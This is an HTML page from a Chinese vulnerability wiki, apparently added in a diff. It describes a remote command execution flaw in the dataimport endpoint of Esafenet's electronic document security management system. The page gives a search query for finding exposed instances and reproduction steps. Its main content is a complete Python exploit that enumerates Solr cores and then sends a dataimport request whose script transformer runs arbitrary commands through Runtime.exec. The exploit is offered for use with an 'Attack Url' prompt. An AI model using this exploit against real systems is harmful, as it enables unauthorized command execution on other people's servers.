@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%9C%AA%E5%88%86%E7%B1%BB/%E4%BA%BF%E8%B5%9B%E9%80%9A%20%E7%94%B5%E5%AD%90%E6%96%87%E6%A1%A3%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20dataimport%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>亿赛通 电子文档安全管理系统 dataimport 远程命令执行漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u4ebf\u8d5b\u901a \u7535\u5b50\u6587\u6863\u5b89\u5168\u7ba1\u7406\u7cfb\u7edf dataimport \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e", url: "#_top", children: [
+              {title: "\u6f0f\u6d1e\u63cf\u8ff0", url: "#_1" },
+              {title: "\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
+              {title: "\u7f51\u7edc\u6d4b\u7ed8", url: "#_3" },
+              {title: "\u6f0f\u6d1e\u590d\u73b0", url: "#_4" },
+              {title: "\u6f0f\u6d1ePOC", url: "#poc" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E4%BA%BF%E9%82%AE%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E7%B3%BB%E7%BB%9F%20moni_detail.do%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E4%BA%BF%E9%82%AE%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E7%B3%BB%E7%BB%9F%20moni_detail.do%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        亿邮电子邮件系统 moni_detail.do 远程命令执行漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E4%BA%BF%E8%B5%9B%E9%80%9A%20%E7%94%B5%E5%AD%90%E6%96%87%E6%A1%A3%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20UploadFileFromClientServiceForClient%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E4%BA%BF%E8%B5%9B%E9%80%9A%20%E7%94%B5%E5%AD%90%E6%96%87%E6%A1%A3%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20UploadFileFromClientServiceForClient%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        亿赛通 电子文档安全管理系统 UploadFileFromClientServiceForClient 任意文件上传漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="dataimport">亿赛通 电子文档安全管理系统 dataimport 远程命令执行漏洞<a class="headerlink" href="#dataimport" title="Permanent link">&para;</a></h1>
+<h2 id="_1">漏洞描述<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>亿赛通 电子文档安全管理系统 dataimport 存在远程命令执行漏洞，攻击者通过构造特定的请求可执行任意命令</p>
+<h2 id="_2">漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>亿赛通 电子文档安全管理系统
+</code></pre></div>
+<h2 id="_3">网络测绘<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>title=&quot;电子文档安全管理系统&quot;
+</code></pre></div>
+<h2 id="_4">漏洞复现<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
+<p>登录页面如下</p>
+<p><img alt="" src="../images/202202091906952.png" /></p>
+<p>先获取 core name</p>
+<p>访问路径</p>
+<div class="highlight"><pre><span></span><code>/solr/admin/cores
+</code></pre></div>
+<p><img alt="" src="../images/202202091906483.png" /></p>
+<p>使用POC执行whoami</p>
+<p><img alt="" src="../images/202202091906902.png" /></p>
+<h2 id="poc">漏洞POC<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">random</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">re</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">base64</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">time</span>
+<span class="kn">from</span><span class="w"> </span><span class="nn">requests.packages.urllib3.exceptions</span><span class="w"> </span><span class="kn">import</span> <span class="n">InsecureRequestWarning</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">title</span><span class="p">():</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;+------------------------------------------&#39;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;+  </span><span class="se">\033</span><span class="s1">[34mPOC_Des: http://wiki.peiqi.tech                                   </span><span class="se">\033</span><span class="s1">[0m&#39;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;+  </span><span class="se">\033</span><span class="s1">[34mGithub : https://github.com/PeiQi0                                 </span><span class="se">\033</span><span class="s1">[0m&#39;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;+  </span><span class="se">\033</span><span class="s1">[34m公众号  : PeiQi文库                                                   </span><span class="se">\033</span><span class="s1">[0m&#39;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;+  </span><span class="se">\033</span><span class="s1">[34mTitle  : 亿赛通 电子文档安全管理系统 dataimport 远程命令执行漏洞            </span><span class="se">\033</span><span class="s1">[0m&#39;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;+  </span><span class="se">\033</span><span class="s1">[36m使用格式:  python3 poc.py                                            </span><span class="se">\033</span><span class="s1">[0m&#39;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;+  </span><span class="se">\033</span><span class="s1">[36mUrl         &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                             </span><span class="se">\033</span><span class="s1">[0m&#39;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;+------------------------------------------&#39;</span><span class="p">)</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">POC_1</span><span class="p">(</span><span class="n">target_url</span><span class="p">):</span>
+    <span class="n">vuln_url</span> <span class="o">=</span> <span class="n">target_url</span> <span class="o">+</span> <span class="s2">&quot;/solr/admin/cores&quot;</span>
+    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s2">&quot;Content-Type&quot;</span><span class="p">:</span> <span class="s2">&quot;application/x-www-form-urlencoded&quot;</span><span class="p">,</span>
+    <span class="p">}</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">requests</span><span class="o">.</span><span class="n">packages</span><span class="o">.</span><span class="n">urllib3</span><span class="o">.</span><span class="n">disable_warnings</span><span class="p">(</span><span class="n">InsecureRequestWarning</span><span class="p">)</span>
+        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">vuln_url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\033</span><span class="s2">[36m[o] 正在请求 </span><span class="si">{}</span><span class="s2">/solr/admin/cores.... </span><span class="se">\033</span><span class="s2">[0m&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">target_url</span><span class="p">))</span>
+        <span class="k">if</span> <span class="s1">&#39;responseHeader&#39;</span> <span class="ow">in</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span> <span class="ow">and</span> <span class="n">response</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
+            <span class="n">result</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span>
+                <span class="sa">r</span><span class="s1">&#39;&lt;str name=&quot;name&quot;&gt;([\s\S]*?)&lt;/str&gt;&lt;str name=&quot;instanceDir&quot;&gt;&#39;</span><span class="p">,</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">,</span> <span class="n">re</span><span class="o">.</span><span class="n">I</span><span class="p">)</span>
+            <span class="n">core_name</span> <span class="o">=</span> <span class="n">result</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+            <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\033</span><span class="s2">[36m[o] 获取core_name : </span><span class="si">{}</span><span class="s2"> </span><span class="se">\033</span><span class="s2">[0m&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">core_name</span><span class="p">))</span>
+            <span class="n">POC_2</span><span class="p">(</span><span class="n">target_url</span><span class="p">,</span> <span class="n">core_name</span><span class="p">)</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\033</span><span class="s2">[31m[x] 请求失败 </span><span class="se">\033</span><span class="s2">[0m&quot;</span><span class="p">)</span>
+            <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\033</span><span class="s2">[31m[x] 请求失败 </span><span class="se">\033</span><span class="s2">[0m&quot;</span><span class="p">,</span> <span class="n">e</span><span class="p">)</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">POC_2</span><span class="p">(</span><span class="n">target_url</span><span class="p">,</span> <span class="n">core_name</span><span class="p">):</span>
+    <span class="n">cmd</span> <span class="o">=</span> <span class="s2">&quot;whoami&quot;</span>
+    <span class="n">vuln_url</span> <span class="o">=</span> <span class="n">target_url</span> <span class="o">+</span> <span class="s2">&quot;/solr/</span><span class="si">{}</span><span class="s2">/dataimport?command=full-import&amp;verbose=false&amp;clean=false&amp;commit=false&amp;debug=true&amp;core=tika&amp;name=dataimport&amp;dataConfig=%0A%3CdataConfig</span><span class="si">%3E</span><span class="s2">%0A%3CdataSource%20name%3D</span><span class="si">%22s</span><span class="s2">treamsrc</span><span class="si">%22%</span><span class="s2">20type%3D%22ContentStreamDataSource</span><span class="si">%22%</span><span class="s2">20loggerLevel%3D%22TRACE</span><span class="si">%22%</span><span class="s2">20</span><span class="si">%2F%3E</span><span class="s2">%0A%0A</span><span class="si">%20%</span><span class="s2">20%3Cscript</span><span class="si">%3E</span><span class="s2">%3C!%5BCDATA%5B%0A</span><span class="si">%20%</span><span class="s2">20</span><span class="si">%20%</span><span class="s2">20</span><span class="si">%20%</span><span class="s2">20</span><span class="si">%20%</span><span class="s2">20</span><span class="si">%20%</span><span class="s2">20function%20poc(row)%7B%0A%20var%20bufReader</span><span class="si">%20%</span><span class="s2">3D%20new%20java.io.BufferedReader(new%20java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(%22</span><span class="si">{}</span><span class="s2">%22).getInputStream()))%3B%0A%0Avar</span><span class="si">%20r</span><span class="s2">esult</span><span class="si">%20%</span><span class="s2">3D</span><span class="si">%20%</span><span class="s2">5B%5D%3B%0A%0Awhile(true)</span><span class="si">%20%</span><span class="s2">7B%0Avar</span><span class="si">%20o</span><span class="s2">neline</span><span class="si">%20%</span><span class="s2">3D%20bufReader.readLine()%3B%0Aresult.push(</span><span class="si">%20o</span><span class="s2">neline%20)%3B%0Aif(!oneline)%20break%3B%0A%7D%0A%0Arow.put(%22title</span><span class="si">%22%</span><span class="s2">2Cresult.join(</span><span class="si">%22%</span><span class="s2">5Cn%5Cr%22))%3B%0Areturn</span><span class="si">%20r</span><span class="s2">ow%3B%0A%0A%7D%0A%0A%5D%5D</span><span class="si">%3E</span><span class="s2">%3C</span><span class="si">%2F</span><span class="s2">script</span><span class="si">%3E</span><span class="s2">%0A%0A%3Cdocument</span><span class="si">%3E</span><span class="s2">%0A</span><span class="si">%20%</span><span class="s2">20</span><span class="si">%20%</span><span class="s2">20%3Centity%0A</span><span class="si">%20%</span><span class="s2">20</span><span class="si">%20%</span><span class="s2">20</span><span class="si">%20%</span><span class="s2">20</span><span class="si">%20%</span><span class="s2">20stream%3D%22true</span><span class="si">%22%</span><span class="s2">0A</span><span class="si">%20%</span><span class="s2">20</span><span class="si">%20%</span><span class="s2">20</span><span class="si">%20%</span><span class="s2">20</span><span class="si">%20%</span><span class="s2">20name%3D</span><span class="si">%22e</span><span class="s2">ntity1</span><span class="si">%22%</span><span class="s2">0A</span><span class="si">%20%</span><span class="s2">20</span><span class="si">%20%</span><span class="s2">20</span><span class="si">%20%</span><span class="s2">20</span><span class="si">%20%</span><span class="s2">20datasource%3D</span><span class="si">%22s</span><span class="s2">treamsrc1</span><span class="si">%22%</span><span class="s2">0A</span><span class="si">%20%</span><span class="s2">20</span><span class="si">%20%</span><span class="s2">20</span><span class="si">%20%</span><span class="s2">20</span><span class="si">%20%</span><span class="s2">20processor%3D</span><span class="si">%22X</span><span class="s2">PathEntityProcessor</span><span class="si">%22%</span><span class="s2">0A</span><span class="si">%20%</span><span class="s2">20</span><span class="si">%20%</span><span class="s2">20</span><span class="si">%20%</span><span class="s2">20</span><span class="si">%20%</span><span class="s2">20rootEntity%3D%22true</span><span class="si">%22%</span><span class="s2">0A</span><span class="si">%20%</span><span class="s2">20</span><span class="si">%20%</span><span class="s2">20</span><span class="si">%20%</span><span class="s2">20</span><span class="si">%20%</span><span class="s2">20forEach%3D</span><span class="si">%22%</span><span class="s2">2FRDF</span><span class="si">%2F</span><span class="s2">item</span><span class="si">%22%</span><span class="s2">0A</span><span class="si">%20%</span><span class="s2">20</span><span class="si">%20%</span><span class="s2">20</span><span class="si">%20%</span><span class="s2">20</span><span class="si">%20%</span><span class="s2">20transformer%3D</span><span class="si">%22s</span><span class="s2">cript%3Apoc</span><span class="si">%22%</span><span class="s2">3E%0A</span><span class="si">%20%</span><span class="s2">20</span><span class="si">%20%</span><span class="s2">20</span><span class="si">%20%</span><span class="s2">20</span><span class="si">%20%</span><span class="s2">20</span><span class="si">%20%</span><span class="s2">20</span><span class="si">%20%</span><span class="s2">20</span><span class="si">%20%</span><span class="s2">3Cfield</span><span class="si">%20c</span><span class="s2">olumn%3D%22title</span><span class="si">%22%</span><span class="s2">20xpath%3D</span><span class="si">%22%</span><span class="s2">2FRDF</span><span class="si">%2F</span><span class="s2">item</span><span class="si">%2F</span><span class="s2">title</span><span class="si">%22%</span><span class="s2">20</span><span class="si">%2F%3E</span><span class="s2">%0A</span><span class="si">%20%</span><span class="s2">20</span><span class="si">%20%</span><span class="s2">20%3C</span><span class="si">%2F</span><span class="s2">entity</span><span class="si">%3E</span><span class="s2">%0A%3C</span><span class="si">%2F</span><span class="s2">document</span><span class="si">%3E</span><span class="s2">%0A%3C</span><span class="si">%2F</span><span class="s2">dataConfig</span><span class="si">%3E</span><span class="s2">%0A</span><span class="si">%20%</span><span class="s2">20</span><span class="si">%20%</span><span class="s2">20%0A</span><span class="si">%20%</span><span class="s2">20</span><span class="si">%20%</span><span class="s2">20</span><span class="si">%20%</span><span class="s2">20</span><span class="si">%20%</span><span class="s2">20</span><span class="si">%20%</span><span class="s2">20%20&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">core_name</span><span class="p">,</span> <span class="n">cmd</span><span class="p">)</span>
+    <span class="n">files</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s1">&#39;stream.body&#39;</span><span class="p">:</span> <span class="s1">&#39;&#39;&#39;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
+<span class="s1">        &lt;RDF&gt;</span>
+<span class="s1">        &lt;item/&gt;</span>
+<span class="s1">        &lt;/RDF&gt;&#39;&#39;&#39;</span>
+    <span class="p">}</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\033</span><span class="s2">[36m[o] 正在执行 whoami ... </span><span class="se">\033</span><span class="s2">[0m&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">target_url</span><span class="p">))</span>
+        <span class="n">requests</span><span class="o">.</span><span class="n">packages</span><span class="o">.</span><span class="n">urllib3</span><span class="o">.</span><span class="n">disable_warnings</span><span class="p">(</span><span class="n">InsecureRequestWarning</span><span class="p">)</span>
+        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">vuln_url</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="n">files</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span>
+        <span class="n">cmd_response</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span>
+                <span class="sa">r</span><span class="s1">&#39;documents&quot;&gt;&lt;lst&gt;&lt;arr name=&quot;title&quot;&gt;&lt;str&gt;([\s\S]*?)&lt;/str&gt;&lt;/arr&gt;&lt;/lst&gt;&#39;</span><span class="p">,</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">,</span> <span class="n">re</span><span class="o">.</span><span class="n">I</span><span class="p">)</span>
+        <span class="n">cmd_response</span> <span class="o">=</span> <span class="n">cmd_response</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span> <span class="ow">and</span> <span class="n">cmd_response</span><span class="p">:</span>
+            <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\033</span><span class="s2">[36m[o] 命令响应为:</span><span class="se">\n</span><span class="si">{}</span><span class="s2"> </span><span class="se">\033</span><span class="s2">[0m&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">cmd_response</span><span class="p">))</span>
+
+    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\033</span><span class="s2">[31m[x] 请求失败 </span><span class="se">\033</span><span class="s2">[0m&quot;</span><span class="p">)</span>
+
+
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+    <span class="n">title</span><span class="p">()</span>
+    <span class="n">target_url</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\033</span><span class="s2">[35mPlease input Attack Url</span><span class="se">\n</span><span class="s2">Url &gt;&gt;&gt; </span><span class="se">\033</span><span class="s2">[0m&quot;</span><span class="p">))</span>
+    <span class="n">POC_1</span><span class="p">(</span><span class="n">target_url</span><span class="p">)</span>
+</code></pre></div>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E4%BA%BF%E9%82%AE%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E7%B3%BB%E7%BB%9F%20moni_detail.do%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E4%BA%BF%E9%82%AE%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E7%B3%BB%E7%BB%9F%20moni_detail.do%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        亿邮电子邮件系统 moni_detail.do 远程命令执行漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E4%BA%BF%E8%B5%9B%E9%80%9A%20%E7%94%B5%E5%AD%90%E6%96%87%E6%A1%A3%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20UploadFileFromClientServiceForClient%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E4%BA%BF%E8%B5%9B%E9%80%9A%20%E7%94%B5%E5%AD%90%E6%96%87%E6%A1%A3%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20UploadFileFromClientServiceForClient%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        亿赛通 电子文档安全管理系统 UploadFileFromClientServiceForClient 任意文件上传漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
